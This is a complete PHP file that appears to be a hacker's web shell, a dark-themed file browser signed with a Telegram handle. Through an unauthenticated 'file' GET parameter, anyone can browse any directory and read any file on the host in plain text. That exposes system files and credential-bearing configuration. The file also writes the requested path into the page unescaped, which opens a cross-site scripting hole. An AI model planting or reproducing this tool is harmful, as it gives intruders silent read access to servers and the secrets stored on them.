<?php
$root = __DIR__;
$styleFile = 'color: #C0C0C0;';  // Silver for files
$styleDir = 'color: #7F7F7F; font-weight: bold;';  // Gray for directories

function updir($ADir) {
    $ADir = substr($ADir, 0, strlen($ADir) - 1);
    $ADir = substr($ADir, 0, strrpos($ADir, '/'));
    return $ADir;
}

if (isset($_GET['file'])) {
    if (is_file($_GET['file'])) {
        header("Content-type: text/plain");
        readfile($_GET['file']);
        return;
    }
    $path = $_GET['file'] . '/';
} else {
    $path = $root . '/';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iComsium</title>
    <style>
        body {
            background-color: #121212; /* Dark background for a professional look */
            color: #E0E0E0; /* Light gray text for readability */
            font-family: 'Courier New', Courier, monospace; /* Monospace font */
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            height: 100vh;
        }

        #content {
            flex: 1;
            padding: 30px;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .info {
            border: 2px solid #555555; /* Dark gray border for info boxes */
            padding: 20px;
            border-radius: 10px;
            background-color: #2C2C2C; /* Slightly lighter dark background for info boxes */
            font-size: 16px;
        }

        .info span {
            color: #7F7F7F; /* Gray color for highlighted path */
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            border-radius: 10px;
            overflow: hidden;
        }

        th, td {
            padding: 12px;
            text-align: left;
            font-size: 15px;
        }

        th {
            color: #C0C0C0; /* Silver color for table headers */
            background-color: #2B2B2B; /* Dark background for header */
            border-bottom: 2px solid #444444; /* Dark border for header */
        }

        tr {
            border-bottom: 1px solid #444444; /* Dark gray border between rows */
        }

        tr:hover {
            background-color: #333333; /* Slightly darker for hover effect */
        }

        a {
            text-decoration: none;
            color: inherit;
            transition: color 0.3s ease;
        }

        .file-link {
            <?php echo $styleFile; ?>
        }

        .dir-link {
            <?php echo $styleDir; ?>
        }

        .footer {
            text-align: center;
            padding: 15px;
            background-color: #121212; /* Dark background */
            color: #E0E0E0; /* Light gray footer text */
            font-size: 14px;
            border-top: 2px solid #444444; /* Dark border for footer */
            border-radius: 0 0 10px 10px; /* Rounded corners for footer */
        }

        .r4m1l_background {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            height: 100%;
            background: url(https://i.imgur.com/Us6y1Th.gif) center center / cover no-repeat;
            opacity: 0.05;
            z-index: 1;
            pointer-events: none;
            border-top-left-radius: 10px;
        }
    </style>
</head>
<body>
<div class="r4m1l_background"></div>
<div id="content">
    <div class="info">
        <td width="1" align="left">
            <nobr>
                <a href="?">
                    <img src="https://i.imgur.com/4OIyQQe.png" style="width:98px;height:105px" alt="t.me/r4m1l">
                    <img src="https://i.imgur.com/TgaOt16.png">
                </a>
            </nobr>
        </td>
        <p>Path: <span><?php echo $path; ?></span></p>
        <p>Current Directory: <span><?php echo $root; ?></span></p>
    </div>
    <table>
        <thead>
            <tr>
                <th>File/Directory</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><a class="dir-link" href="?file=<?php echo updir($path); ?>">..</a></td>
            </tr>
            <?php
            $p = $path . '*';
            foreach (glob($p) as $file) {
                echo '<tr>';
                echo '<td><a class="' . (is_file($file) ? 'file-link' : 'dir-link') . '" href="?file=' . $file . '">' . basename($file) . '</a></td>';
                echo '</tr>';
            }
            ?>
        </tbody>
    </table>
</div>
<div class="footer">
    &copy; 2024 iComsium. All rights reserved by Ramil Feyziyev.
</div>
</body>
</html>
